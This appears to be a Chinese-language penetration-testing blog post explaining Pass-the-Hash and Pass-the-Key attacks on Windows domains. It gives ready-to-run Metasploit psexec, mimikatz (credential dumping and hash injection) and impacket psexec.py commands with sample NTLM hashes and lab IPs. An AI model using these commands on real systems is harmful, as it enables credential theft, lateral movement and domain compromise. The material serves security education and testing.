---
title: "内网渗透-Pass The Hash(Key) 凭据传递攻击"
date: 2020-08-31 11:56:23 +0800
category: 内网渗透
tags: [内网,域]
excerpt: 内网渗透-Pass The Hash(Key) 凭据传递攻击
---
# Pass The Hash(Key) 凭据传递攻击
## 原理
	由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key(使用sekurlsa::ekeys导出来)，就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。
## 利用条件
+ 在工作组环境中：
Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。

+ 在域环境中：
只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器
+ 修改目标机器的 LocalAccountTokenFilterPolicy 为1后，使用普通域管理员账号也可进行哈希传递攻击
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
````
## 利用方法
### msf
```
use exploit/windows/smb/psexec_psh 
msf5 exploit(windows/smb/psexec_psh) > set rhosts 192.168.1.107
msf5 exploit(windows/smb/psexec_psh) > set smbuser Administrator
exploit(windows/smb/psexec_psh) > set smbpass 31d6cfe0d16ae931b73c59d7e0c089c0:249dbaafa8643e3d2f7c692761ba83e7
```
或者
```
use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set rhosts 192.168.1.107
msf5 exploit(windows/smb/psexec) > set smbpass 31d6cfe0d16ae931b73c59d7e0c089c0:249dbaafa8643e3d2f7c692761ba83e7
msf5 exploit(windows/smb/psexec) > set smbuser Administrator
msf5 exploit(windows/smb/psexec) > run
```
### mimikatz
```
privilege::debug
sekurlsa::pth /user:用户名 /domain:域名 /ntlm:NTLMHash
```

### impacket
impacket底下执行远程命令执行的脚本有5个
> psexec.py
> smbexec.py
> atexec.py
> wmiexec.py
> dcomexec.py
都支持使用hash进行远程命令执行，通过--hashes指定hash,以psexec.py为例

#### psexec.py
```
python /usr/share/doc/python3-impacket/examples/psexec.py -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:249dbaafa8643e3d2f7c692761ba83e7 ./Administrator@192.168.1.109
```
## pass the key
+ 前提：只适用于域环境，并且目标主机需要安装 KB2871997补丁(LocalAccountTokenFilterPolicy 为1)
```
//使用mimikatz抓取AES-256密钥
privilege::debug
sekurlsa::ekeys
//导入
privilege::debug
sekurlsa::pth /user:用户名 /domain:域名 /aes256:AES256密钥
//查看DC的共享文件夹
dir \\dc\c$
```